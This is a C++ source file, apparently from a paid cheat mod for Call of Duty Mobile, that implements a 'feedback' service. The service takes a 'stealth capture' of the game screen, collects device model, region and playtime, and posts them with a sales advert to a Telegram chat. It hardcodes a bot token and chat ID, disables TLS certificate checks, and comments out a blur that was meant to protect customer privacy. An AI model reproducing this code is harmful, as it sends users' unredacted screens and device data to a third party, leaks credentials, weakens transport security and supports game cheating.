#include "FeedbackService.h"

#include <GLES2/gl2.h>
#include <curl/curl.h>
#include <sys/system_properties.h>
#include <android/log.h>

#include <chrono>
#include <thread>
#include <mutex>
#include <atomic>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <iostream>
#include <cctype>

#ifndef STBI_INCLUDE_STB_IMAGE_WRITE_H
#define STBI_INCLUDE_STB_IMAGE_WRITE_H
#define STB_IMAGE_WRITE_STATIC
#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"
#endif

extern std::chrono::steady_clock::time_point appStartTime;
extern int lastMatchResult;

namespace {

constexpr const char* kLogTag = "@HookerhooksBot";
const char* kHardcodedFeedbackBotToken = "8964417942:AAGWxFYjza0yaUNudSoVtW0CfGbiJLr8NXA"; 
const char* kHardcodedFeedbackChatId = "-1003885110512"; 

FeedbackState g_FeedbackState;
std::mutex g_FeedbackStatusMutex;
std::string g_FeedbackStatus = "Idle";
bool g_FeedbackStatusIsError = false;
std::atomic<bool> g_FeedbackSending{false};

std::mutex g_PendingCaptureMutex;
bool g_HasPendingCapture = false;
FeedbackState g_PendingCaptureSnapshot;
std::string g_PendingCaptureFilesDirPath;

void BlurRGBA(std::vector<unsigned char>& pixels, int width, int height, int radius) {
    if (radius < 1) return;
    
    std::vector<unsigned char> temp = pixels;
    int wm = width - 1;
    int hm = height - 1;
    int div = radius + radius + 1;
    
    // Horizontal Pass
    for (int y = 0; y < height; y++) {
        int rsum = 0, gsum = 0, bsum = 0;
        
        for (int i = -radius; i <= radius; i++) {
            int x = std::max(0, std::min(wm, i));
            int idx = (y * width + x) * 4;
            rsum += temp[idx];
            gsum += temp[idx + 1];
            bsum += temp[idx + 2];
        }
        
        for (int x = 0; x < width; x++) {
            int targetIdx = (y * width + x) * 4;
            pixels[targetIdx]     = rsum / div;
            pixels[targetIdx + 1] = gsum / div;
            pixels[targetIdx + 2] = bsum / div;
            
            int nextX = std::max(0, std::min(wm, x + radius + 1));
            int prevX = std::max(0, std::min(wm, x - radius));
            
            int nextIdx = (y * width + nextX) * 4;
            int prevIdx = (y * width + prevX) * 4;
            
            rsum += temp[nextIdx]     - temp[prevIdx];
            gsum += temp[nextIdx + 1] - temp[prevIdx + 1];
            bsum += temp[nextIdx + 2] - temp[prevIdx + 2];
        }
    }
    
    temp = pixels;
    
    // Vertical Pass
    for (int x = 0; x < width; x++) {
        int rsum = 0, gsum = 0, bsum = 0;
        
        for (int i = -radius; i <= radius; i++) {
            int y = std::max(0, std::min(hm, i));
            int idx = (y * width + x) * 4;
            rsum += temp[idx];
            gsum += temp[idx + 1];
            bsum += temp[idx + 2];
        }
        
        for (int y = 0; y < height; y++) {
            int targetIdx = (y * width + x) * 4;
            pixels[targetIdx]     = rsum / div;
            pixels[targetIdx + 1] = gsum / div;
            pixels[targetIdx + 2] = bsum / div;
            
            int nextY = std::max(0, std::min(hm, y + radius + 1));
            int prevY = std::max(0, std::min(hm, y - radius));
            
            int nextIdx = (nextY * width + x) * 4;
            int prevIdx = (prevY * width + x) * 4;
            
            rsum += temp[nextIdx]     - temp[prevIdx];
            gsum += temp[nextIdx + 1] - temp[prevIdx + 1];
            bsum += temp[nextIdx + 2] - temp[prevIdx + 2];
        }
    }
}

std::string GetAndroidSystemProp(const char* key) {
    char value[PROP_VALUE_MAX] = {};
    __system_property_get(key, value);
    return (value[0] != '\0') ? std::string(value) : "Unknown";
}

std::string GetDeviceModel() {
    return GetAndroidSystemProp("ro.product.brand") + " " + GetAndroidSystemProp("ro.product.model");
}

bool IsUnknownPropValue(const std::string& value) {
    return value.empty() || value == "Unknown" || value == "unknown";
}

std::string NormalizeRegionValue(const std::string& value) {
    if (IsUnknownPropValue(value)) return "";
    std::string token = value;
    const size_t comma = token.find(',');
    if (comma != std::string::npos) token = token.substr(0, comma);
    const size_t separator = token.find_last_of("-_");
    if (separator != std::string::npos && separator + 1 < token.size()) {
        token = token.substr(separator + 1);
    }
    std::string normalized;
    normalized.reserve(token.size());
    for (unsigned char ch : token) {
        if (std::isalpha(ch)) normalized.push_back(static_cast<char>(std::toupper(ch)));
    }
    return normalized.size() >= 2 ? normalized : "";
}

std::string GetDeviceRegion() {
    static const char* kRegionProps[] = {
        "gsm.operator.iso-country", "ro.miui.region", "persist.sys.country",
        "persist.sys.locale.country", "ro.product.locale.region", "persist.sys.locale", "ro.config.locale"
    };
    for (const char* key : kRegionProps) {
        const std::string region = NormalizeRegionValue(GetAndroidSystemProp(key));
        if (!region.empty()) return region;
    }
    return "Unknown";
}

std::string GetFormattedPlaytime() {
    const auto currentDuration = std::chrono::steady_clock::now() - appStartTime;
    const auto totalSeconds = std::chrono::duration_cast<std::chrono::seconds>(currentDuration).count();
    const long hours = totalSeconds / 3600;
    const long minutes = (totalSeconds % 3600) / 60;
    const long seconds = totalSeconds % 60;
    char buf[64] = {};
    snprintf(buf, sizeof(buf), "%ldh %ldm %lds", hours, minutes, seconds);
    return std::string(buf);
}

bool EnsureCurlInitialized(std::string* errorOut = nullptr) {
    static std::once_flag once;
    static bool initialized = false;
    static CURLcode initCode = CURLE_OK;
    std::call_once(once, []() {
        initCode = curl_global_init(CURL_GLOBAL_DEFAULT);
        initialized = (initCode == CURLE_OK);
    });
    if (!initialized && errorOut) {
        *errorOut = std::string("curl_global_init failed: ") + curl_easy_strerror(initCode);
    }
    return initialized;
}

void SetFeedbackStatus(const std::string& text, bool isError = false) {
    std::lock_guard<std::mutex> lock(g_FeedbackStatusMutex);
    g_FeedbackStatus = text;
    g_FeedbackStatusIsError = isError;
    __android_log_print(isError ? ANDROID_LOG_ERROR : ANDROID_LOG_INFO, kLogTag, "%s", text.c_str());
}

size_t FeedbackWriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    const size_t total = size * nmemb;
    if (!contents || !userp || total == 0) return 0;
    reinterpret_cast<std::string*>(userp)->append(reinterpret_cast<const char*>(contents), total);
    return total;
}

bool CaptureFeedbackScreenshotJPG(const std::string& savePath, std::string* errorOut) {
    GLint viewport[4] = {0, 0, 0, 0};
    glGetIntegerv(GL_VIEWPORT, viewport);

    int width = viewport[2]; 
    int height = viewport[3]; 
    if (width <= 0 || height <= 0) { 
        if (errorOut) *errorOut = "Invalid viewport size"; 
        return false; 
    } 
    
    std::vector<unsigned char> pixels(static_cast<size_t>(width) * static_cast<size_t>(height) * 4u); 
    glPixelStorei(GL_PACK_ALIGNMENT, 1); 
    glFinish(); 
    glReadPixels(0, 0, width, height, GL_RGBA, GL_UNSIGNED_BYTE, pixels.data()); 
    
    if (glGetError() != GL_NO_ERROR) { 
        if (errorOut) *errorOut = "glReadPixels failed"; 
        return false; 
    } 

    // Auto blur setup para sa customer safety
    // BlurRGBA(pixels, width, height, 15);  <-- COMMENTED OUT TO REMOVE BLUR

    std::vector<unsigned char> flipped(static_cast<size_t>(width) * static_cast<size_t>(height) * 4u); 
    for (int y = 0; y < height; y++) { 
        memcpy(&flipped[y * width * 4], &pixels[(height - y - 1) * width * 4], width * 4); 
    } 
    
    if (!stbi_write_jpg(savePath.c_str(), width, height, 4, flipped.data(), 80)) { 
        if (errorOut) *errorOut = "stbi_write_jpg failed to save"; 
        return false; 
    } 
    return true; 
}

bool SendTelegramPhoto(const std::string& token, const std::string& chatId, const std::string& filePath, const std::string& caption, std::string* errorOut) {
    if (!EnsureCurlInitialized(errorOut)) return false;

    std::ifstream file(filePath, std::ios::binary); 
    if (!file.is_open()) { 
        if (errorOut) *errorOut = "Unable to open screenshot file"; 
        return false; 
    } 
    const std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()); 
    file.close(); 
    if (fileContent.empty()) { 
        if (errorOut) *errorOut = "Screenshot file is empty"; 
        return false; 
    } 
    
    CURL* curl = curl_easy_init(); 
    if (!curl) { 
        if (errorOut) *errorOut = "curl_easy_init failed"; 
        return false; 
    } 
    
    std::string response; 
    const std::string url = "https://api.telegram.org/bot" + token + "/sendPhoto"; 
    const std::string boundary = "----AstralBoundary7MA4YWxkTrZu0gW"; 
    std::string body; 
    body.reserve(fileContent.size() + 1024); 
    body += "--" + boundary + "\r\n"; 
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"; 
    body += chatId + "\r\n"; 
    body += "--" + boundary + "\r\n"; 
    body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"; 
    body += caption + "\r\n"; 
    body += "--" + boundary + "\r\n"; 
    body += "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\n"; 
    body += "HTML\r\n"; 
    body += "--" + boundary + "\r\n"; 
    body += "Content-Disposition: form-data; name=\"photo\"; filename=\"feedback.jpg\"\r\n"; 
    body += "Content-Type: image/jpeg\r\n\r\n"; 
    body.append(fileContent.data(), fileContent.size()); 
    body += "\r\n--" + boundary + "--\r\n"; 
    
    struct curl_slist* headers = nullptr; 
    headers = curl_slist_append(headers, ("Content-Type: multipart/form-data; boundary=" + boundary).c_str()); 
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str()); 
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers); 
    curl_easy_setopt(curl, CURLOPT_POST, 1L); 
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str()); 
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, static_cast<long>(body.size())); 
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, FeedbackWriteCallback); 
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response); 
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L); 
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); 
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); 
    
    const CURLcode res = curl_easy_perform(curl); 
    long statusCode = 0; 
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &statusCode); 
    curl_slist_free_all(headers); 
    curl_easy_cleanup(curl); 
    
    if (res != CURLE_OK) { 
        if (errorOut) *errorOut = curl_easy_strerror(res); 
        return false; 
    } 
    if (statusCode != 200 || response.find("\"ok\":true") == std::string::npos) { 
        if (errorOut) *errorOut = response.empty() ? "Telegram API error" : response; 
        return false; 
    } 
    return true; 
}

std::string BuildFeedbackPayload(const FeedbackState& snapshot) {
    const std::string device = GetDeviceModel();
    const std::string playtime = GetFormattedPlaytime();
    const std::string region = GetDeviceRegion();

    std::ostringstream oss; 
    oss << "<code><b>DARMODZ V3 AUTO FEEDBACK</b></code>\n\n"; 
    oss << "<b>⏱️ Playtime:</b> <code>" << playtime << "</code>\n"; 
    oss << "<b>📱 Device:</b> <code>" << device << "</code>\n"; 
    oss << "<b>🌍 Region:</b> <code>" << region << "</code>\n"; 
    oss << "<b>🎮 Game:</b> <code>Call Of Duty Mobile Garena</code>\n"; 
    oss << "<b>🔧 Version:</b> <code>1.6.57</code>\n"; 
    oss << "<b>🛡️ Status:</b> <code>Safe</code>\n\n"; 
    
    // oss << "<b>Note:</b> <code>The pictures are made unclear to keep customer information safe.</code>\n\n";
    oss << "<b>🛒 BUY KEY TO:</b> @ThaxxylHax"; 
    if (snapshot.note[0] != '\0') { 
        oss << "\n<b>📝 Logs:</b> " << snapshot.note; 
    } 
    return oss.str(); 
}

void LaunchSendWorker(const FeedbackState& snapshot, const std::string& screenshotPath, const std::string& screenshotWarning) {
    std::thread([snapshot, screenshotPath, screenshotWarning]() {
        std::string error;

        std::string token(snapshot.botToken); 
        if (token.empty() && kHardcodedFeedbackBotToken[0] != '\0') { 
            token = kHardcodedFeedbackBotToken; 
        } 
        std::string chat(snapshot.chatId); 
        if (chat.empty() && kHardcodedFeedbackChatId[0] != '\0') { 
            chat = kHardcodedFeedbackChatId; 
        } 
        const bool hasScreenshot = !screenshotPath.empty(); 
        const std::string payload = BuildFeedbackPayload(snapshot); 
        bool ok = false; 
        if (hasScreenshot) { 
            ok = SendTelegramPhoto(token, chat, screenshotPath, payload, &error); 
        } 
        if (!ok) { 
            SetFeedbackStatus("Send failed: " + error, true); 
        } else { 
            SetFeedbackStatus("Feedback to DARMODZ has been successfully sent.", false); 
        } 
        g_FeedbackSending.store(false); 
    }).detach(); 
}

} // namespace

namespace feedback {

FeedbackState& State() {
    return g_FeedbackState;
}

bool HasHardcodedBotToken() { return kHardcodedFeedbackBotToken[0] != '\0'; }
bool HasHardcodedChatId() { return kHardcodedFeedbackChatId[0] != '\0'; }
bool IsSending() { return g_FeedbackSending.load(); }

void GetStatus(std::string& outText, bool& outIsError) {
    std::lock_guard<std::mutex> lock(g_FeedbackStatusMutex);
    outText = g_FeedbackStatus;
    outIsError = g_FeedbackStatusIsError;
}

void StartSendAsync(const FeedbackState& snapshot, const std::string& filesDirPath) {
    if (g_FeedbackSending.exchange(true)) {
        return;
    }

    SetFeedbackStatus("Queuing stealth capture...", false);
    std::lock_guard<std::mutex> lock(g_PendingCaptureMutex);
    g_PendingCaptureSnapshot = snapshot;
    
    if(filesDirPath.empty()) {
        g_PendingCaptureFilesDirPath = "/storage/emulated/0/Android/data/com.garena.game.codm/files";
    } else {
        g_PendingCaptureFilesDirPath = filesDirPath;
    }
    g_HasPendingCapture = true;
}

void PumpAfterRender() {
    FeedbackState snapshot;
    std::string filesDirPath;
    {
        std::lock_guard<std::mutex> lock(g_PendingCaptureMutex);
        if (!g_HasPendingCapture) return;
        
        snapshot = g_PendingCaptureSnapshot;
        filesDirPath = g_PendingCaptureFilesDirPath;
        g_HasPendingCapture = false;
    }

    std::string screenshotPath = filesDirPath + "/feedback_capture.jpg";
    std::string error;
    
    if (!CaptureFeedbackScreenshotJPG(screenshotPath, &error)) {
        screenshotPath.clear();
    }

    LaunchSendWorker(snapshot, screenshotPath, error);
}

} // namespace feedback